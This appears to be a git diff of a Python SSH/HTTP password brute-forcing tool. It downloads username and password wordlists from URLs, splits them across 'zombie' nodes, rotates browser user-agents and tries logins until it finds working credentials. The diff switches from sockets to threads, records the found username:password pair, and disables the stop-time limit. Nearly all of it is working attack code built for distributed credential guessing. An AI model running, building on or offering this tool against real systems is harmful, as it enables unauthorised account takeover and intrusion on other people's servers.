@@ -3,7 +3,7 @@
 # r3nt0n
 
 
-import random, socket, time, os
+import os, shutil
 from datetime import datetime
 
 from app.modules import http_client, ssh_client, files_mgmt
@@ -11,17 +11,18 @@ from app.components import config
 
 class Bruteforcer:
     def __init__(self, attack_type, target, wordlists, to_stop_at=datetime.strftime(datetime.now(), '%Y-%m-%d %H:%M:%S'),
-                 port=80, n_sockets=150, slice_wl="1/1", sleeptime=15):
+                 port=80, n_threads=1, slice_wl="1/1", sleeptime=15):
         self.attack_type = attack_type
         self.target = target
         self.wordlists = wordlists
         self.slice_wl = slice_wl
         self.to_stop_at = to_stop_at
         self.port = port
-        self.n_sockets = n_sockets
+        self.n_threads = n_threads
         self.sleeptime = sleeptime
-        self.first_word_position = ""
-        self.last_word_position = ""
+        self.first_word_position = {}
+        self.last_word_position = {}
+        self.combo_found = None
 
         #self.list_of_threads = []
         self.user_agents = (
@@ -79,9 +80,11 @@ class Bruteforcer:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edge/44.19041.4788"
         )
 
-        self.report = 'Initializing report. Number of sockets used: {}\r\nHTTPS enabled: {}\r\nSleep time: {}\r\nAttack started at {}...\r\nRequest sent:\r\n'.format(self.n_sockets, self.https, self.sleeptime, datetime.now().strftime("%Y-%m-%d, %H:%M:%S"))
+        self.report = 'Initializing report. Number of threads used: {}\r\nSleep time: {}\r\nAttack started at {}...\r\n'.format(self.n_threads, self.sleeptime, datetime.now().strftime("%Y-%m-%d, %H:%M:%S"))
 
     def download_and_save_wordlists(self):
+        # create TEMP dir
+        os.makedirs(config.TEMP_DIR)
         for wordlist_url in self.wordlists:
             if self.wordlists[wordlist_url]:
                 path_to_file = os.path.join(config.TEMP_DIR, wordlist_url)
@@ -96,23 +99,31 @@ class Bruteforcer:
                 total_lines = files_mgmt.count_file_lines(self.wordlists[wordlist_path])
                 p, t = self.slice_wl.split("/")
                 lines_per_zombie = int(total_lines) / int(t)
-                self.first_word_position = (lines_per_zombie * (p-1)) - 1
-                self.last_word_position = (lines_per_zombie * (p))
+                self.first_word_position[wordlist_path] = (lines_per_zombie * (p-1)) - 1
+                self.last_word_position[wordlist_path] = (lines_per_zombie * (p))
 
 
 
     def run(self):
         hostname = self.target
-        socket_count = self.n_sockets
-        self.report += "\r\nAttacking {} with {} sockets.".format(hostname, socket_count)
+        socket_count = self.n_threads
+        self.report += "\r\nAttacking {} with {} threads.".format(hostname, socket_count)
 
         # read all wordlists provided from url
         self.download_and_save_wordlists()
         self.get_first_and_last_word_positions()
 
+        from app.components import logger
+        logger.log("Usernames wordlist: {}".format(self.wordlists["usernames"]), 'INFO')
+        logger.log("Passwords wordlist: {}".format(self.wordlists["passwords"]), 'INFO')
+        logger.log("First word position (users wl): {}".format(self.first_word_position["usernames"]), 'INFO')
+        logger.log("Last word position (users wl): {}".format(self.last_word_position["usernames"]), 'INFO')
+        logger.log("First word position (pswds wl): {}".format(self.first_word_position["passwords"]), 'INFO')
+        logger.log("Last word position (pswds wl): {}".format(self.last_word_position["passwords"]), 'INFO')
+
         with open(self.wordlists["usernames"], 'r') as usernames_wl:
             u_count = 0
-            while True:
+            while not self.combo_found:
                 u_count += 1
                 # Get next line from file
                 u_line = usernames_wl.readline()
@@ -140,12 +151,13 @@ class Bruteforcer:
                                 succesful_login = ssh_client.ssh_login(hostname, username, password)
                                 if succesful_login:
                                     self.report += '\r\ncombo u:p found -> {}:{}'.format(username, password)
+                                    self.combo_found = username + ":" + password
                                     break
 
                             # break attack by stop time
-                            stop_time = datetime.strptime(self.to_stop_at, '%Y-%m-%d %H:%M:%S')
-                            if datetime.now() >= stop_time:
-                                break
+                            # stop_time = datetime.strptime(self.to_stop_at, '%Y-%m-%d %H:%M:%S')
+                            # if datetime.now() >= stop_time:
+                            #     break
 
                             # self.report += "\r\nSleeping for %d seconds".format(self.sleeptime)
                             # time.sleep(self.sleeptime)
@@ -153,9 +165,14 @@ class Bruteforcer:
                         except (KeyboardInterrupt, SystemExit):
                             self.report += "\r\nStopping attack"
                             break
+        if self.combo_found:
+            self.report += "SUCCESSFUL BRUTEFORCE ATTACK, combo u:p found => {}".format(self.combo_found)
 
+        # delete TEMP dir and content
+        shutil.rmtree(config.TEMP_DIR)
 
 if __name__ == "__main__":
     # usage example
-    attack = Bruteforcer('ssh', '127.0.0.1', port=23, to_stop_at='2021-07-02 20:58:00', n_sockets=1000)
+    attack = Bruteforcer('ssh', '127.0.0.1', {"usernames": "http://127.0.0.1:8080/users.txt", "passwords": "http://127.0.0.1:8080/1000.txt"},
+                         slice_wl="1/1", port=23)#, to_stop_at='2021-07-02 20:58:00')
     attack.run()
